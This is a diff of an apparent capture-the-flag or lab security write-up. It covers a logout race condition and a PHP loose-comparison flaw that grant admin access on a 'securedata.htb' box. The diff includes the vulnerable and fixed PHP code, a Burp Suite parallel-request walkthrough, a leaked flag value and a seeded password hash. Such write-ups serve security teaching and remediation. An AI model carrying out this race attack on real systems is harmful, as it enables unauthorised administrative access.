-             <?php include_once("common/_header.php"); ?>                                                                                                                                    
-                                                                                                                                                                                             
-             <!-- page content unchanged -->                                                                                                                                                 
-                                                                                                                                                                                             
-             <div class="container">                                                                                                                                                         
-                 <div class="row">                                                                                                                                                           
-                     <!-- ... counters ... -->                                                                                                                                               
-                     <div class="col-12 col-lg-9">                                                                                                                                           
-                         <div class="card">                                                                                                                                                  
-                             <div class="card-body">                                                                                                                                         
-                                 <h3 class="mb-0">Query publicly accessible files here:</h3>                                                                                                 
-                                 <br>                                                                                                                                                        
-                                 <div class="fm-search">                                                                                                                                     
-                                     <input type="text" class="form-control" id="search" placeholder="Search">                                                                               
-                                 </div>                                                                                                                                                      
-                                 <br>                                                                                                                                                        
-                                 <h5 class="mb-0">Search Results</h5>                                                                                                                        
-                                 <div class="table-responsive mt-3">                                                                                                                         
-                                     <table class="table table-striped table-hover table-sm mb-0">                                                                                           
-                                         <thead>                                                                                                                                             
-                                             <tr>                                                                                                                                            
-                                                 <th>Name</th>                                                                                                                               
-                                                 <th>Access</th>                                                                                                                             
-                                                 <th>Created At</th>                                                                                                                         
-                                                 <th>Download</th>                                                                                                                           
-                                             </tr>                                                                                                                                           
-                                         </thead>                                                                                                                                            
-                                         <tbody>                                                                                                                                             
-                                             <?php                                                                                                                                           
-                                                 foreach (array_slice($results, 0, 5) as $value) {                                                                                           
-                                                     $download_link = get_download_link((string)$value->filename);                                                                           
-                                                     $filename = htmlspecialchars((string)$value->filename, ENT_QUOTES, 'UTF-8');                                                            
-                                                     $access   = htmlspecialchars((string)$value->access, ENT_QUOTES, 'UTF-8');                                                              
-                                                     $created  = htmlspecialchars((string)$value->created, ENT_QUOTES, 'UTF-8');                                                             
-                                                     echo "<tr>";                                                                                                                            
-                                                     echo "<td><div class=\"d-flex align-items-center\"><i class=\"bx me-2 font-24 {$value->type}\"></i><div                                 
-   class=\"font-weight-bold\">{$filename}</div></div></td>";                                                                                                                                 
-                                                     echo "<td>{$access}</td>";                                                                                                              
-                                                     echo "<td>{$created}</td>";                                                                                                             
-                                                     echo "<td>{$download_link}</td>";                                                                                                       
-                                                     echo "</tr>";                                                                                                                           
-                                                 }                                                                                                                                           
-                                             ?>                                                                                                                                              
-                                         </tbody>                                                                                                                                            
-                                     </table>                                                                                                                                                
-                                 </div>                                                                                                                                                      
-                             </div>                                                                                                                                                          
-                         </div>                                                                                                                                                              
-                     </div>                                                                                                                                                                  
-                 </div>                                                                                                                                                                      
-             </div>                                                                                                                                                                          
-                                                                                                                                                                                             
-             <form action="query.php" method="get">                                                                                                                                          
-                 <input type="hidden" name="q" id="search_form" />                                                                                                                           
-             </form>                                                                                                                                                                         
-                                                                                                                                                                                             
-             <?php include_once("common/_footer.php"); ?>                                                                                                                                    
-         </body>                                                                                                                                                                             
-     </html>                                                                                                                                                                                 
-   ```                                                                                                                                                                                       
-                                                                                                                   
-                                                                  
+
+
+   ```php
+     <?php
+     require_once('common/session.php');
+     require_once('common/xpath.php');
+
+     // query.php is public, but we still apply the sanitized XPath functions.
+     $query = isset($_GET['q']) ? $_GET['q'] : 'doesnotexist';
+     $results = query_public($query);
+
+     // File download handling
+     if (isset($_GET['file'])) {
+         $token = isset($_GET['token']) ? $_GET['token'] : '';
+         if (!is_download_token_valid($_GET['file'], $token)) {
+             header('HTTP/1.1 401 Unauthorized');
+             echo 'Invalid Download Token!';
+             exit();
+         }
+
+         $filepath = get_filepath($_GET['file']);
+         if (!$filepath || !file_exists($filepath) || !is_file($filepath)) {
+             header('HTTP/1.1 404 Not Found');
+             echo 'File not found!';
+             exit();
+         }
+
+         header('Content-Type: application/octet-stream');
+         header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
+         header('Content-Length: ' . filesize($filepath));
+
+         readfile($filepath);
+         exit();
+     }
+     ?>
+
+     <!DOCTYPE html>
+     <html lang="en">
+         <head>
+             <?php include_once("common/_head.php"); ?>
+         </head>
+         <body>
+             <?php include_once("common/_header.php"); ?>
+
+             <!-- page content unchanged -->
+
+             <div class="container">
+                 <div class="row">
+                     <!-- ... counters ... -->
+                     <div class="col-12 col-lg-9">
+                         <div class="card">
+                             <div class="card-body">
+                                 <h3 class="mb-0">Query publicly accessible files here:</h3>
+                                 <br>
+                                 <div class="fm-search">
+                                     <input type="text" class="form-control" id="search" placeholder="Search">
+                                 </div>
+                                 <br>
+                                 <h5 class="mb-0">Search Results</h5>
+                                 <div class="table-responsive mt-3">
+                                     <table class="table table-striped table-hover table-sm mb-0">
+                                         <thead>
+                                             <tr>
+                                                 <th>Name</th>
+                                                 <th>Access</th>
+                                                 <th>Created At</th>
+                                                 <th>Download</th>
+                                             </tr>
+                                         </thead>
+                                         <tbody>
+                                             <?php
+                                                 foreach (array_slice($results, 0, 5) as $value) {
+                                                     $download_link = get_download_link((string)$value->filename);
+                                                     $filename = htmlspecialchars((string)$value->filename, ENT_QUOTES, 'UTF-8');
+                                                     $access   = htmlspecialchars((string)$value->access, ENT_QUOTES, 'UTF-8');
+                                                     $created  = htmlspecialchars((string)$value->created, ENT_QUOTES, 'UTF-8');
+                                                     echo "<tr>";
+                                                     echo "<td><div class=\"d-flex align-items-center\"><i class=\"bx me-2 font-24 {$value->type}\"></i><div
+   class=\"font-weight-bold\">{$filename}</div></div></td>";
+                                                     echo "<td>{$access}</td>";
+                                                     echo "<td>{$created}</td>";
+                                                     echo "<td>{$download_link}</td>";
+                                                     echo "</tr>";
+                                                 }
+                                             ?>
+                                         </tbody>
+                                     </table>
+                                 </div>
+                             </div>
+                         </div>
+                     </div>
+                 </div>
+             </div>
+
+             <form action="query.php" method="get">
+                 <input type="hidden" name="q" id="search_form" />
+             </form>
+
+             <?php include_once("common/_footer.php"); ?>
+         </body>
+     </html>
+   ```
+
+
 
 
 ### Race condition on admin_panel.php {#2b749d43-75e4-4608-ba24-404b1cadbaae}
@@ -4745,8 +4721,8 @@ CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (6.0 - Medium)
 
 #### Affected Component(s)
 
-* session.php – get_session_user() and destroy_session()   
-* session_manager.php – validates session via get_session_user() 
+* session.php – get_session_user() and destroy_session()
+* session_manager.php – validates session via get_session_user()
 
 #### External References
 
@@ -4755,400 +4731,404 @@ CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (6.0 - Medium)
 
 #### Description & Cause
 
-The admin access controls in admin_panel.php and session_manager.php rely on two separate database lookups that are not synchronized with logout:                                         
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {                                                                                                            
-         header("Location: /index.php");                                                                                                                                                     
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-     $user_role = get_session_properties($_COOKIE["session"])["role"];                                                                                                                       
-     if ($user_role != 0) {                                                                                                                                                                  
-         header("Location: /home.php");                                                                                                                                                      
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   When a user clicks logout, logout.php calls destroy_session(), which executes:                                                                                                            
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     $sql = "DELETE FROM sessions WHERE token=?";                                                                                                                                            
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   This delete is not atomic with the validation above. If an attacker sends a logout request and an admin-panel request at the same time, the admin request can reach get_session_user()    
-   while the session row still exists in the database. The lookup succeeds, the code proceeds to get_session_properties(), and the admin page begins to render.                              
-                                                                                                                                                                                             
-   The situation is worsened by type juggling in the role check:                                                                                                                             
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     if ($user_role != 0) {                                                                                                                                                                  
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   This uses loose comparison (!=). If get_session_properties() returns null — for example because the user row was deleted or corrupted between the two queries, or because the session row 
-   disappeared mid-request — then:                                                                                                                                                           
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     $user_role = null["role"];                                                                                                                                                              
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   produces null. In PHP, null != 0 evaluates to false, so the redirect is skipped and the request is treated as an admin.                                                                   
-                                                                                                                                                                                             
-   Combined effect: a session that is being destroyed can still reach the admin panel. If the second lookup returns null or any non-numeric string during the race window, the loose         
-   comparison grants admin access instead of rejecting the request.                                                                                                                          
-                                                                                                                                                                                             
-   Causes                                                                                                                                                                                    
-                                                                                                                                                                                             
-   1. Race condition between session validation and logout (session.php, logout.php, admin_panel.php)                                                                                        
-      get_session_user() and destroy_session() both operate on the same shared sessions table. There is no lock, token revocation list, or transactional isolation, so one request can       
-      validate a token while another request is deleting it.                                                                                                                                 
-                                                                                                                                                                                             
-   2. Two separate lookups without consistency check (admin_panel.php, session_manager.php)                                                                                                  
-      The code first checks the session table, then fetches the user record. It never verifies that get_session_properties() actually returned a valid user array before using it.           
-                                                                                                                                                                                             
-   3. Loose comparison in role check (admin_panel.php:12, session_manager.php:24)                                                                                                            
-      if ($user_role != 0) allows PHP to type-juggle null, empty strings, and non-numeric strings to 0, accidentally satisfying the admin condition.                                         
-                                                                                                                                                                                             
-   4. Missing null guard                                                                                                                                                                     
-      There is no check such as if ($user === null) after get_session_properties(), so a failed lookup can propagate null into the role comparison.                                          
-                                                                                                                                                                                             
-   Vulnerable code together                                                                                                                                                                  
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     // logout.php                                                                                                                                                                           
-     $sessiontoken = $_COOKIE["session"];                                                                                                                                                    
-     destroy_session($sessiontoken);          // DELETE runs asynchronously with other requests                                                                                              
-     setcookie('session', '');                                                                                                                                                               
-                                                                                                                                                                                             
-     // admin_panel.php                                                                                                                                                                      
-     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {                                                                                                            
-         header("Location: /index.php");       // race: session still exists here                                                                                                            
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-     $user_role = get_session_properties($_COOKIE["session"])["role"];  // may return null                                                                                                   
-     if ($user_role != 0) {                   // null != 0 is false -> admin granted                                                                                                         
-         header("Location: /home.php");                                                                                                                                                      
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   This combination means that even after a session is destroyed, a concurrent admin-panel request can slip through and, if the user lookup returns null, be treated as an admin. 
+The admin access controls in admin_panel.php and session_manager.php rely on two separate database lookups that are not synchronized with logout:
+
+   ```php
+     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {
+         header("Location: /index.php");
+         exit();
+     }
+     $user_role = get_session_properties($_COOKIE["session"])["role"];
+     if ($user_role != 0) {
+         header("Location: /home.php");
+         exit();
+     }
+   ```
+
+   When a user clicks logout, logout.php calls destroy_session(), which executes:
+
+   ```php
+     $sql = "DELETE FROM sessions WHERE token=?";
+   ```
+
+   This delete is not atomic with the validation above. If an attacker sends a logout request and an admin-panel request at the same time, the admin request can reach get_session_user()
+   while the session row still exists in the database. The lookup succeeds, the code proceeds to get_session_properties(), and the admin page begins to render.
+
+   The situation is worsened by type juggling in the role check:
+
+   ```php
+     if ($user_role != 0) {
+   ```
+
+   This uses loose comparison (!=). If get_session_properties() returns null — for example because the user row was deleted or corrupted between the two queries, or because the session row
+   disappeared mid-request — then:
+
+   ```php
+     $user_role = null["role"];
+   ```
+
+   produces null. In PHP, null != 0 evaluates to false, so the redirect is skipped and the request is treated as an admin.
+
+   Combined effect: a session that is being destroyed can still reach the admin panel. If the second lookup returns null or any non-numeric string during the race window, the loose
+   comparison grants admin access instead of rejecting the request.
+
+   Causes
+
+   1. Race condition between session validation and logout (session.php, logout.php, admin_panel.php)
+      get_session_user() and destroy_session() both operate on the same shared sessions table. There is no lock, token revocation list, or transactional isolation, so one request can
+      validate a token while another request is deleting it.
+
+   2. Two separate lookups without consistency check (admin_panel.php, session_manager.php)
+      The code first checks the session table, then fetches the user record. It never verifies that get_session_properties() actually returned a valid user array before using it.
+
+   3. Loose comparison in role check (admin_panel.php:12, session_manager.php:24)
+      if ($user_role != 0) allows PHP to type-juggle null, empty strings, and non-numeric strings to 0, accidentally satisfying the admin condition.
+
+   4. Missing null guard
+      There is no check such as if ($user === null) after get_session_properties(), so a failed lookup can propagate null into the role comparison.
+
+   Vulnerable code together
+
+   ```php
+     // logout.php
+     $sessiontoken = $_COOKIE["session"];
+     destroy_session($sessiontoken);          // DELETE runs asynchronously with other requests
+     setcookie('session', '');
+
+     // admin_panel.php
+     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {
+         header("Location: /index.php");       // race: session still exists here
+         exit();
+     }
+     $user_role = get_session_properties($_COOKIE["session"])["role"];  // may return null
+     if ($user_role != 0) {                   // null != 0 is false -> admin granted
+         header("Location: /home.php");
+         exit();
+     }
+   ```
+
+   This combination means that even after a session is destroyed, a concurrent admin-panel request can slip through and, if the user lookup returns null, be treated as an admin.
 
 #### Security Impact
 
-                
-                                                                                                                                                                                             
-   • Unauthorized admin access – a concurrent request to /admin/admin_panel.php or /admin/session_manager.php may succeed after logout, exposing the admin dashboard, system logs, and the   
-     flag file /opt/user/sec_user.txt.                                                                                                                                                       
-   • Session management abuse – if session_manager.php is reached, the attacker can view or destroy active user sessions.                                                                    
+
+
+   • Unauthorized admin access – a concurrent request to /admin/admin_panel.php or /admin/session_manager.php may succeed after logout, exposing the admin dashboard, system logs, and the
+     flag file /opt/user/sec_user.txt.
+   • Session management abuse – if session_manager.php is reached, the attacker can view or destroy active user sessions.
    • Privilege escalation via type juggling – if the user lookup returns null during the race, the loose role comparison treats the request as admin, allowing a non-admin or deleted session
-     to gain administrative access.                                                                                                                                                          
-   • Bypass of logout as a security control – logout no longer reliably terminates access, weakening session lifecycle management.                                                           
-                                                                                                                                                                                             
+     to gain administrative access.
+   • Bypass of logout as a security control – logout no longer reliably terminates access, weakening session lifecycle management.
+
    The attack is network-based, requires only a previously valid session, and can be attempted with automated concurrent requests.
 
 #### Detailed Walkthrough
 
-   1. Capture the requests                                                                                                                                                                   
-      Log in as an admin and navigate to http://securedata.htb/admin/admin_panel.php. Use Burp Suite to intercept two requests:                                                              
-       • GET /logout.php – the logout request.                                                                                                                                               
-       • GET /admin/admin_panel.php – the admin panel request.                                                                                                                               
-                                                                                                                                                                                             
-   2. Send both requests to Repeater                                                                                                                                                         
-      Right-click each intercepted request and select Send to Repeater. You now have two tabs:                                                                                               
-       • Repeater tab 1: GET /logout.php                                                                                                                                                     
-       • Repeater tab 2: GET /admin/admin_panel.php                                                                                                                                          
-                                                                                                                                                                                             
-   3. Prepare multiple admin-panel attempts                                                                                                                                                  
-      In the Repeater tab for /admin/admin_panel.php, right-click the request and select Send to Repeater repeatedly until you have at least 10 separate Repeater tabs all pointing to the   
-      admin panel. This increases the chance that one request lands inside the race window.                                                                                                  
-                                                                                                                                                                                             
-   4. Send all requests in parallel                                                                                                                                                          
-      Select all admin-panel Repeater tabs together with the single logout tab. Use Burp’s Send group in parallel (single-packet attack) or Send group in parallel feature to fire all       
-      requests at the same time.                                                                                                                                                             
-                                                                                                                                                                                             
-   5. Observe the race window                                                                                                                                                                
-      Because logout.php deletes the session row while the admin-panel requests are validating it, some admin-panel requests will execute their get_session_user() lookup before the DELETE  
-      commits. Those requests see a valid session and proceed to render the admin panel.                                                                                                     
-                                                                                                                                                                                             
-   6. Flag leaks in the response                                                                                                                                                             
-      The successful admin-panel responses contain the rendered admin page, including:                                                                                                       
-                                                                                                                                                                                             
-      ```html                                                                                                                                                                                
-        FLAG: 39d18b5b75ce0bbba31b19630812e1b7                                                                                                                                          
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
+   1. The requests were captured.
+      Log in as an admin and navigate to http://securedata.htb/admin/admin_panel.php. Use Burp Suite to intercept two requests:
+       • GET /logout.php – the logout request.
+       • GET /admin/admin_panel.php – the admin panel request.
+
+   2. Send both requests to Repeater
+      Right-click each intercepted request and select Send to Repeater. You now have two tabs:
+       • Repeater tab 1: GET /logout.php
+       • Repeater tab 2: GET /admin/admin_panel.php
+
+   3. Prepare multiple admin-panel attempts
+      In the Repeater tab for /admin/admin_panel.php, right-click the request and select Send to Repeater repeatedly until you have at least 10 separate Repeater tabs all pointing to the
+      admin panel. This increases the chance that one request lands inside the race window.
+
+   4. Send all requests in parallel
+      Select all admin-panel Repeater tabs together with the single logout tab. Use Burp’s Send group in parallel (single-packet attack) or Send group in parallel feature to fire all
+      requests at the same time.
+
+   5. Observe the race window
+      Because logout.php deletes the session row while the admin-panel requests are validating it, some admin-panel requests will execute their get_session_user() lookup before the DELETE
+      commits. Those requests see a valid session and proceed to render the admin panel.
+
+   6. Flag leaks in the response
+      The successful admin-panel responses contain the rendered admin page, including:
+
+      ```html
+        FLAG: 39d18b5b75ce0bbba31b19630812e1b7
+      ```
+
       Even though the logout request eventually deletes the session row, the winning admin-panel request already retrieved the flag.
 
-                                                            
-                                                               ![](assets/Screenshot-from-2026-08-11-00-49-21.png){width="auto"}
 
-   ![](assets/edited-ygPbfeXD.png){width="auto"}
+                                                               
+
+![11 00 49 21](assets/Screenshot-from-2026-08-11-00-49-21.png)
+
+   
+
+![ygPbfeXD](assets/edited-ygPbfeXD.png)
    Result: The race condition between logout and session validation allows an attacker to access the admin panel after logout, leaking the first flag.
 
 #### Patching and Remediation
 
-   1. Use strict comparison (!==) for the admin role check to eliminate type juggling.                                                                                                       
-   2. Guard against null after fetching user properties.                                                                                                                                     
-   3. Make logout atomic and immediately visible by marking sessions as invalidated rather than deleting rows, and include that check in get_session_user().                                 
-   4. Use database transactions with row locking (SELECT FOR UPDATE) when validating or invalidating a session.                                                                              
-   5. Regenerate session tokens on login and enforce short session lifetimes.                                                                                                                
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   Fixed code                                                                                                                                                                                
-                                                                                                                                                                                             
-   1. db_schema.sql                                                                                                                                                                          
-                                                                                                                                                                                             
-   Add an invalidated flag to the sessions table:                                                                                                                                            
-                                                                                                                                                                                             
-   ```sql                                                                                                                                                                                    
-     CREATE TABLE `users` (                                                                                                                                                                  
-       `id` int NOT NULL primary key AUTO_INCREMENT,                                                                                                                                         
-       `username` TEXT NOT NULL,                                                                                                                                                             
-       `role` int NOT NULL,                                                                                                                                                                  
-       `password` TEXT NOT NULL                                                                                                                                                              
-     );                                                                                                                                                                                      
-                                                                                                                                                                                             
-     CREATE TABLE `sessions` (                                                                                                                                                               
-       `id` int NOT NULL primary key AUTO_INCREMENT,                                                                                                                                         
-       `token` TEXT NOT NULL,                                                                                                                                                                
-       `user_id` TEXT NOT NULL,                                                                                                                                                              
-       `invalidated` tinyint(1) NOT NULL DEFAULT 0,                                                                                                                                          
-       `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP                                                                                                                             
-     );                                                                                                                                                                                      
-                                                                                                                                                                                             
-     INSERT INTO `users` (`username`, `role`, `password`) VALUES                                                                                                                             
-     ('developer', 1, '$2a$12$hstCruIkPcUmcUBlE6lHYe23A3d6tqIAnpLBdAM/10B0Dk3LJqV/a');                                                                                                   
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   2. session.php                                                                                                                                                                            
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     require_once dirname(__FILE__) . '/config.php';                                                                                                                                         
-                                                                                                                                                                                             
-     function generate_session_token()                                                                                                                                                       
-     {                                                                                                                                                                                       
-         return bin2hex(random_bytes(32));                                                                                                                                                   
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function create_session($user_id)                                                                                                                                                       
-     {                                                                                                                                                                                       
-         global $conn;                                                                                                                                                                       
-                                                                                                                                                                                             
-         $token = generate_session_token();                                                                                                                                                  
-         $sql = "INSERT INTO sessions (token, user_id, invalidated) VALUES (?,?,0)";                                                                                                         
-         $stmt = mysqli_stmt_init($conn);                                                                                                                                                    
-         if (!mysqli_stmt_prepare($stmt, $sql)) {                                                                                                                                            
-             echo "SQL Error";                                                                                                                                                               
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         mysqli_stmt_bind_param($stmt, "ss", $token, $user_id);                                                                                                                              
-         mysqli_stmt_execute($stmt);                                                                                                                                                         
-         return $token;                                                                                                                                                                      
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function destroy_session($token)                                                                                                                                                        
-     {                                                                                                                                                                                       
-         global $conn;                                                                                                                                                                       
-                                                                                                                                                                                             
-         // Mark invalidated atomically instead of deleting                                                                                                                                  
-         $sql = "UPDATE sessions SET invalidated=1 WHERE token=? AND invalidated=0";                                                                                                         
-         $stmt = mysqli_stmt_init($conn);                                                                                                                                                    
-         if (!mysqli_stmt_prepare($stmt, $sql)) {                                                                                                                                            
-             echo "SQL Error";                                                                                                                                                               
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         mysqli_stmt_bind_param($stmt, "s", $token);                                                                                                                                         
-         mysqli_stmt_execute($stmt);                                                                                                                                                         
-         return true;                                                                                                                                                                        
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function get_session_user($token)                                                                                                                                                       
-     {                                                                                                                                                                                       
-         global $conn;                                                                                                                                                                       
-                                                                                                                                                                                             
-         $sql = "SELECT user_id FROM sessions WHERE token=? AND invalidated=0";                                                                                                              
-         $stmt = mysqli_stmt_init($conn);                                                                                                                                                    
-         if (!mysqli_stmt_prepare($stmt, $sql)) {                                                                                                                                            
-             echo "SQL Error";                                                                                                                                                               
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         mysqli_stmt_bind_param($stmt, "s", $token);                                                                                                                                         
-         mysqli_stmt_execute($stmt);                                                                                                                                                         
-         $result = mysqli_stmt_get_result($stmt);                                                                                                                                            
-                                                                                                                                                                                             
-         if ($row = mysqli_fetch_assoc($result)) {                                                                                                                                           
-             log_query();                                                                                                                                                                    
-             return $row['user_id'];                                                                                                                                                         
-         }                                                                                                                                                                                   
-         return false;                                                                                                                                                                       
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function get_session_properties($token)                                                                                                                                                 
-     {                                                                                                                                                                                       
-         global $conn;                                                                                                                                                                       
-                                                                                                                                                                                             
-         $user_id = intval(get_session_user($token));                                                                                                                                        
-         if (!$user_id) {                                                                                                                                                                    
-             return null;                                                                                                                                                                    
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         $sql = "SELECT * FROM users WHERE id=?";                                                                                                                                            
-         $stmt = mysqli_stmt_init($conn);                                                                                                                                                    
-         if (!mysqli_stmt_prepare($stmt, $sql)) {                                                                                                                                            
-             echo "SQL Error";                                                                                                                                                               
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         mysqli_stmt_bind_param($stmt, "i", $user_id);                                                                                                                                       
-         mysqli_stmt_execute($stmt);                                                                                                                                                         
-         $result = mysqli_stmt_get_result($stmt);                                                                                                                                            
-                                                                                                                                                                                             
-         if ($row = mysqli_fetch_assoc($result)) {                                                                                                                                           
-             return $row;                                                                                                                                                                    
-         }                                                                                                                                                                                   
-         return null;                                                                                                                                                                        
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function get_source_ip()                                                                                                                                                                
-     {                                                                                                                                                                                       
-         $ip = $_SERVER['REMOTE_ADDR'];                                                                                                                                                      
-         return $ip;                                                                                                                                                                         
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function log_query()                                                                                                                                                                    
-     {                                                                                                                                                                                       
-         global $logfile;                                                                                                                                                                    
-         global $log_url;                                                                                                                                                                    
-         $ip = get_source_ip();                                                                                                                                                              
-         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';                                                                                                                                            
-         $uri = $_SERVER['REQUEST_URI'];                                                                                                                                                     
-         $request_id = hash('sha256', $ip . $ua . $uri . time());                                                                                                                            
-                                                                                                                                                                                             
-         $params = array(                                                                                                                                                                    
-             "ip" => $ip,                                                                                                                                                                    
-             "ua" => $ua,                                                                                                                                                                    
-             "uri" => $uri,                                                                                                                                                                  
-             "id" => $request_id,                                                                                                                                                            
-         );                                                                                                                                                                                  
-         $ch = curl_init($log_url . "?" . http_build_query($params));                                                                                                                        
-         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                                                                                                                                     
-         curl_setopt($ch, CURLOPT_TIMEOUT, 3);                                                                                                                                               
-         curl_exec($ch);                                                                                                                                                                     
-         curl_close($ch);                                                                                                                                                                    
-                                                                                                                                                                                             
-         file_put_contents($logfile, "{$uri} - {$ua} - {$ip} (Request ID: {$request_id})\n", FILE_APPEND);                                                                                   
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function query_sessions_by_user($username)                                                                                                                                              
-     {                                                                                                                                                                                       
-         global $conn;                                                                                                                                                                       
-                                                                                                                                                                                             
-         $username = "%{$username}%";                                                                                                                                                        
-         $sql = "SELECT users.username, users.role, sessions.token FROM users, sessions WHERE users.id=sessions.user_id AND sessions.invalidated=0 AND users.username LIKE ?";               
-         $stmt = mysqli_stmt_init($conn);                                                                                                                                                    
-         if (!mysqli_stmt_prepare($stmt, $sql)) {                                                                                                                                            
-             echo "SQL Error";                                                                                                                                                               
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         mysqli_stmt_bind_param($stmt, "s", $username);                                                                                                                                      
-         mysqli_stmt_execute($stmt);                                                                                                                                                         
-         $result = mysqli_stmt_get_result($stmt);                                                                                                                                            
-                                                                                                                                                                                             
-         if ($result->num_rows === 0) {                                                                                                                                                      
-             return false;                                                                                                                                                                   
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         log_query();                                                                                                                                                                        
-         return $result;                                                                                                                                                                     
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function query_sessions_by_token($token)                                                                                                                                                
-     {                                                                                                                                                                                       
-         global $conn;                                                                                                                                                                       
-                                                                                                                                                                                             
-         $token = "%{$token}%";                                                                                                                                                              
-         $sql = "SELECT users.username, users.role, sessions.token FROM users, sessions WHERE users.id=sessions.user_id AND sessions.invalidated=0 AND sessions.token LIKE ?";               
-         $stmt = mysqli_stmt_init($conn);                                                                                                                                                    
-         if (!mysqli_stmt_prepare($stmt, $sql)) {                                                                                                                                            
-             echo "SQL Error";                                                                                                                                                               
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         mysqli_stmt_bind_param($stmt, "s", $token);                                                                                                                                         
-         mysqli_stmt_execute($stmt);                                                                                                                                                         
-         $result = mysqli_stmt_get_result($stmt);                                                                                                                                            
-                                                                                                                                                                                             
-         if ($result->num_rows === 0) {                                                                                                                                                      
-             return false;                                                                                                                                                                   
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         log_query();                                                                                                                                                                        
-         return $result;                                                                                                                                                                     
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   3. admin_panel.php                                                                                                                                                                        
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     require_once '../common/session.php';                                                                                                                                                   
-                                                                                                                                                                                             
-     // check valid session                                                                                                                                                                  
-     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {                                                                                                            
-         header("Location: /index.php");                                                                                                                                                     
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     // fetch user properties safely                                                                                                                                                         
-     $user = get_session_properties($_COOKIE["session"]);                                                                                                                                    
-     if ($user === null || !isset($user["role"])) {                                                                                                                                          
-         header("Location: /index.php");                                                                                                                                                     
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     // strict role check                                                                                                                                                                    
-     $user_role = (int)$user["role"];                                                                                                                                                        
-     if ($user_role !== 0) {                                                                                                                                                                 
-         header("Location: /home.php");                                                                                                                                                      
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   Apply the same change to session_manager.php.                                                                                                                                             
-                                                                                                                                                                                             
-   4. logout.php                                                                                                                                                                             
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     require_once ('common/session.php');                                                                                                                                                    
-                                                                                                                                                                                             
-     if (!isset($_COOKIE["session"])) {                                                                                                                                                      
-         header("Location: /index.php");                                                                                                                                                     
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     $sessiontoken = $_COOKIE["session"];                                                                                                                                                    
-     destroy_session($sessiontoken);                                                                                                                                                         
-                                                                                                                                                                                             
-     // Clear the cookie on the client side as well                                                                                                                                          
-     setcookie('session', '', [                                                                                                                                                              
-         'expires' => time() - 3600,                                                                                                                                                         
-         'path' => '/',                                                                                                                                                                      
-         'secure' => true,                                                                                                                                                                   
-         'httponly' => true,                                                                                                                                                                 
-         'samesite' => 'Strict'                                                                                                                                                              
-     ]);                                                                                                                                                                                     
-                                                                                                                                                                                             
-     header("Location: /index.php");                                                                                                                                                         
-     exit();                                                                                                                                                                                 
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
+   1. Use strict comparison (!==) for the admin role check to eliminate type juggling.
+   2. Guard against null after fetching user properties.
+   3. Make logout atomic and immediately visible by marking sessions as invalidated rather than deleting rows, and include that check in get_session_user().
+   4. Use database transactions with row locking (SELECT FOR UPDATE) when validating or invalidating a session.
